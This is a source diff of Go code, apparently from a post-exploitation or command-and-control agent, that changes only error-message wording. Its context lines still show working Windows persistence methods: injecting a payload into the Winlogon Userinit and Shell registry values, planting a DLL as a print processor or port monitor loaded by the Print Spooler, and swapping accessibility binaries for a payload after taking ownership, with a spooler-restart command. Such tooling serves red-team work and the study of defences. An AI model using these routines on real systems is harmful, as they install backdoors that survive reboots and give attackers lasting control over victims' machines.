@@ -29,7 +29,7 @@ func persistWinlogon(args persistArgs) structs.CommandResult {
 	}
 
 	if target != "userinit" && target != "shell" {
-		return errorf("Error: name must be 'userinit' or 'shell' for winlogon method (got '%s')", args.Name)
+		return errorf("name must be 'userinit' or 'shell' for winlogon method (got '%s')", args.Name)
 	}
 
 	switch strings.ToLower(args.Action) {
@@ -37,14 +37,14 @@ func persistWinlogon(args persistArgs) structs.CommandResult {
 		if args.Path == "" {
 			exe, err := os.Executable()
 			if err != nil {
-				return errorf("Error getting executable path: %v", err)
+				return errorf("getting executable path: %v", err)
 			}
 			args.Path = exe
 		}
 
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return errorf("Error opening HKLM\\%s: %v (admin required)", winlogonKeyPath, err)
+			return errorf("opening HKLM\\%s: %v (admin required)", winlogonKeyPath, err)
 		}
 		defer key.Close()
 
@@ -55,12 +55,12 @@ func persistWinlogon(args persistArgs) structs.CommandResult {
 
 	case "remove":
 		if args.Path == "" {
-			return errorResult("Error: path is required for winlogon removal (to identify the injected entry)")
+			return errorResult("path is required for winlogon removal (to identify the injected entry)")
 		}
 
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return errorf("Error opening HKLM\\%s: %v", winlogonKeyPath, err)
+			return errorf("opening HKLM\\%s: %v", winlogonKeyPath, err)
 		}
 		defer key.Close()
 
@@ -70,18 +70,18 @@ func persistWinlogon(args persistArgs) structs.CommandResult {
 		return winlogonRemoveShell(key, args.Path)
 
 	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+		return errorf("unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
 func winlogonInstallUserinit(key registry.Key, payload string) structs.CommandResult {
 	current, _, err := key.GetStringValue("Userinit")
 	if err != nil {
-		return errorf("Error reading Userinit value: %v", err)
+		return errorf("reading Userinit value: %v", err)
 	}
 
 	if strings.Contains(current, payload) {
-		return errorf("Error: payload already in Userinit value: %s", current)
+		return errorf("payload already in Userinit value: %s", current)
 	}
 
 	// Userinit is comma-delimited, e.g. "C:\Windows\system32\userinit.exe,"
@@ -92,7 +92,7 @@ func winlogonInstallUserinit(key registry.Key, payload string) structs.CommandRe
 	newValue := trimmed + payload + ","
 
 	if err := key.SetStringValue("Userinit", newValue); err != nil {
-		return errorf("Error setting Userinit: %v", err)
+		return errorf("setting Userinit: %v", err)
 	}
 
 	return successf("Installed Winlogon Helper persistence (Userinit):\n  Key:       HKLM\\%s\\Userinit\n  Original:  %s\n  Modified:  %s\n  Trigger:   Runs at every user logon (winlogon.exe → userinit chain)", winlogonKeyPath, current, newValue)
@@ -101,18 +101,18 @@ func winlogonInstallUserinit(key registry.Key, payload string) structs.CommandRe
 func winlogonInstallShell(key registry.Key, payload string) structs.CommandResult {
 	current, _, err := key.GetStringValue("Shell")
 	if err != nil {
-		return errorf("Error reading Shell value: %v", err)
+		return errorf("reading Shell value: %v", err)
 	}
 
 	if strings.Contains(current, payload) {
-		return errorf("Error: payload already in Shell value: %s", current)
+		return errorf("payload already in Shell value: %s", current)
 	}
 
 	// Shell is comma-delimited, default: "explorer.exe"
 	newValue := current + "," + payload
 
 	if err := key.SetStringValue("Shell", newValue); err != nil {
-		return errorf("Error setting Shell: %v", err)
+		return errorf("setting Shell: %v", err)
 	}
 
 	return successf("Installed Winlogon Helper persistence (Shell):\n  Key:       HKLM\\%s\\Shell\n  Original:  %s\n  Modified:  %s\n  Trigger:   Runs at every user logon alongside explorer.exe", winlogonKeyPath, current, newValue)
@@ -121,7 +121,7 @@ func winlogonInstallShell(key registry.Key, payload string) structs.CommandResul
 func winlogonRemoveUserinit(key registry.Key, payload string) structs.CommandResult {
 	current, _, err := key.GetStringValue("Userinit")
 	if err != nil {
-		return errorf("Error reading Userinit: %v", err)
+		return errorf("reading Userinit: %v", err)
 	}
 
 	cleaned := strings.Replace(current, payload+",", "", 1)
@@ -129,11 +129,11 @@ func winlogonRemoveUserinit(key registry.Key, payload string) structs.CommandRes
 		cleaned = strings.Replace(current, ","+payload, "", 1)
 	}
 	if cleaned == current {
-		return errorf("Error: payload '%s' not found in Userinit value: %s", payload, current)
+		return errorf("payload '%s' not found in Userinit value: %s", payload, current)
 	}
 
 	if err := key.SetStringValue("Userinit", cleaned); err != nil {
-		return errorf("Error restoring Userinit: %v", err)
+		return errorf("restoring Userinit: %v", err)
 	}
 
 	return successf("Removed Winlogon Userinit persistence:\n  Key:    HKLM\\%s\\Userinit\n  Before: %s\n  After:  %s", winlogonKeyPath, current, cleaned)
@@ -142,7 +142,7 @@ func winlogonRemoveUserinit(key registry.Key, payload string) structs.CommandRes
 func winlogonRemoveShell(key registry.Key, payload string) structs.CommandResult {
 	current, _, err := key.GetStringValue("Shell")
 	if err != nil {
-		return errorf("Error reading Shell: %v", err)
+		return errorf("reading Shell: %v", err)
 	}
 
 	cleaned := strings.Replace(current, ","+payload, "", 1)
@@ -150,11 +150,11 @@ func winlogonRemoveShell(key registry.Key, payload string) structs.CommandResult
 		cleaned = strings.Replace(cleaned, payload+",", "", 1)
 	}
 	if cleaned == current {
-		return errorf("Error: payload '%s' not found in Shell value: %s", payload, current)
+		return errorf("payload '%s' not found in Shell value: %s", payload, current)
 	}
 
 	if err := key.SetStringValue("Shell", cleaned); err != nil {
-		return errorf("Error restoring Shell: %v", err)
+		return errorf("restoring Shell: %v", err)
 	}
 
 	return successf("Removed Winlogon Shell persistence:\n  Key:    HKLM\\%s\\Shell\n  Before: %s\n  After:  %s", winlogonKeyPath, current, cleaned)
@@ -178,12 +178,12 @@ func persistPrintProcessor(args persistArgs) structs.CommandResult {
 	switch strings.ToLower(args.Action) {
 	case "install":
 		if args.Path == "" {
-			return errorResult("Error: path is required (DLL to install as print processor)")
+			return errorResult("path is required (DLL to install as print processor)")
 		}
 
 		// Verify source DLL exists
 		if _, err := os.Stat(args.Path); err != nil {
-			return errorf("Error: source DLL not found: %v", err)
+			return errorf("source DLL not found: %v", err)
 		}
 
 		// Copy DLL to print processor directory
@@ -192,23 +192,23 @@ func persistPrintProcessor(args persistArgs) structs.CommandResult {
 
 		src, err := os.Open(args.Path)
 		if err != nil {
-			return errorf("Error opening source DLL '%s': %v", args.Path, err)
+			return errorf("opening source DLL '%s': %v", args.Path, err)
 		}
 		defer src.Close()
 
 		dst, err := os.Create(destPath)
 		if err != nil {
-			return errorf("Error creating '%s': %v (admin required, print service may lock directory)", destPath, err)
+			return errorf("creating '%s': %v (admin required, print service may lock directory)", destPath, err)
 		}
 		defer dst.Close()
 
 		bytes, err := io.Copy(dst, src)
 		if err != nil {
 			dst.Close()
-			return errorf("Error copying DLL: %v", err)
+			return errorf("copying DLL: %v", err)
 		}
 		if err := dst.Close(); err != nil {
-			return errorf("Error finalizing DLL copy: %v", err)
+			return errorf("finalizing DLL copy: %v", err)
 		}
 
 		// Register in registry — Driver value is just the filename
@@ -216,13 +216,13 @@ func persistPrintProcessor(args persistArgs) structs.CommandResult {
 		if err != nil {
 			// Clean up copied DLL on registry failure
 			os.Remove(destPath)
-			return errorf("Error creating HKLM\\%s: %v (admin required)", regPath, err)
+			return errorf("creating HKLM\\%s: %v (admin required)", regPath, err)
 		}
 		defer key.Close()
 
 		if err := key.SetStringValue("Driver", dllName); err != nil {
 			os.Remove(destPath)
-			return errorf("Error setting Driver value: %v", err)
+			return errorf("setting Driver value: %v", err)
 		}
 
 		return successf("Installed print processor persistence:\n  Name:     %s\n  DLL:      %s → %s (%d bytes)\n  Registry: HKLM\\%s\n  Driver:   %s\n  Trigger:  Loaded by spoolsv.exe when Print Spooler starts", args.Name, args.Path, destPath, bytes, regPath, dllName)
@@ -248,7 +248,7 @@ func persistPrintProcessor(args persistArgs) structs.CommandResult {
 		return successf("Removed print processor persistence:\n  Name:     %s\n  Registry: HKLM\\%s (shredded)\n  DLL:      %s (secure removed)", args.Name, regPath, dllPath)
 
 	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+		return errorf("unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
@@ -271,12 +271,12 @@ func persistPortMonitor(args persistArgs) structs.CommandResult {
 	switch strings.ToLower(args.Action) {
 	case "install":
 		if args.Path == "" {
-			return errorResult("Error: path is required (DLL to install as port monitor)")
+			return errorResult("path is required (DLL to install as port monitor)")
 		}
 
 		// Verify source DLL exists
 		if _, err := os.Stat(args.Path); err != nil {
-			return errorf("Error: source DLL not found: %v", err)
+			return errorf("source DLL not found: %v", err)
 		}
 
 		// Port monitor DLLs are loaded from System32
@@ -291,36 +291,36 @@ func persistPortMonitor(args persistArgs) structs.CommandResult {
 		// Copy DLL to System32
 		src, err := os.Open(args.Path)
 		if err != nil {
-			return errorf("Error opening source DLL '%s': %v", args.Path, err)
+			return errorf("opening source DLL '%s': %v", args.Path, err)
 		}
 		defer src.Close()
 
 		dst, err := os.Create(destPath)
 		if err != nil {
-			return errorf("Error creating '%s': %v (admin required)", destPath, err)
+			return errorf("creating '%s': %v (admin required)", destPath, err)
 		}
 		defer dst.Close()
 
 		bytes, err := io.Copy(dst, src)
 		if err != nil {
 			dst.Close()
-			return errorf("Error copying DLL: %v", err)
+			return errorf("copying DLL: %v", err)
 		}
 		if err := dst.Close(); err != nil {
-			return errorf("Error finalizing DLL copy: %v", err)
+			return errorf("finalizing DLL copy: %v", err)
 		}
 
 		// Register in registry — Driver value is just the filename
 		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
 		if err != nil {
 			os.Remove(destPath)
-			return errorf("Error creating HKLM\\%s: %v (admin required)", regPath, err)
+			return errorf("creating HKLM\\%s: %v (admin required)", regPath, err)
 		}
 		defer key.Close()
 
 		if err := key.SetStringValue("Driver", dllName); err != nil {
 			os.Remove(destPath)
-			return errorf("Error setting Driver value: %v", err)
+			return errorf("setting Driver value: %v", err)
 		}
 
 		return successf("Installed port monitor persistence:\n  Name:     %s\n  DLL:      %s → %s (%d bytes)\n  Registry: HKLM\\%s\n  Driver:   %s\n  Trigger:  Loaded by spoolsv.exe when Print Spooler starts\n  Note:     Requires admin. Restart spooler to load immediately:\n            net stop spooler && net start spooler", args.Name, args.Path, destPath, bytes, regPath, dllName)
@@ -352,7 +352,7 @@ func persistPortMonitor(args persistArgs) structs.CommandResult {
 		return successf("Removed port monitor persistence:\n  Name:     %s\n  Registry: HKLM\\%s (shredded)\n  DLL:      %s (secure removed from System32)", args.Name, regPath, dllName)
 
 	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+		return errorf("unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
@@ -388,7 +388,7 @@ func persistAccessibility(args persistArgs) structs.CommandResult {
 
 		// Verify target exists
 		if _, err := os.Stat(targetPath); err != nil {
-			return errorf("Error: target binary not found: %s (%v)", targetPath, err)
+			return errorf("target binary not found: %s (%v)", targetPath, err)
 		}
 
 		// Step 1: Take ownership (required for TrustedInstaller-owned files)
@@ -403,12 +403,12 @@ func persistAccessibility(args persistArgs) structs.CommandResult {
 
 		// Step 3: Backup original binary
 		if err := copyFileSimple(targetPath, backupPath); err != nil {
-			return errorf("Error backing up %s → %s: %v", targetPath, backupPath, err)
+			return errorf("backing up %s → %s: %v", targetPath, backupPath, err)
 		}
 
 		// Step 4: Replace with payload
 		if err := copyFileSimple(args.Path, targetPath); err != nil {
-			return errorf("Error replacing %s with %s: %v", targetPath, args.Path, err)
+			return errorf("replacing %s with %s: %v", targetPath, args.Path, err)
 		}
 
 		// Look up trigger description
@@ -425,7 +425,7 @@ func persistAccessibility(args persistArgs) structs.CommandResult {
 	case "remove":
 		// Restore from backup
 		if _, err := os.Stat(backupPath); err != nil {
-			return errorf("Error: backup not found at %s — cannot restore original binary", backupPath)
+			return errorf("backup not found at %s — cannot restore original binary", backupPath)
 		}
 
 		// Take ownership of the replaced binary
@@ -437,7 +437,7 @@ func persistAccessibility(args persistArgs) structs.CommandResult {
 
 		// Restore original from backup
 		if err := copyFileSimple(backupPath, targetPath); err != nil {
-			return errorf("Error restoring %s from backup: %v", targetPath, err)
+			return errorf("restoring %s from backup: %v", targetPath, err)
 		}
 
 		// Clean up backup
@@ -446,7 +446,7 @@ func persistAccessibility(args persistArgs) structs.CommandResult {
 		return successf("Removed accessibility feature persistence:\n  Restored: %s from backup\n  Cleaned:  %s removed", targetPath, backupPath)
 
 	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+		return errorf("unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
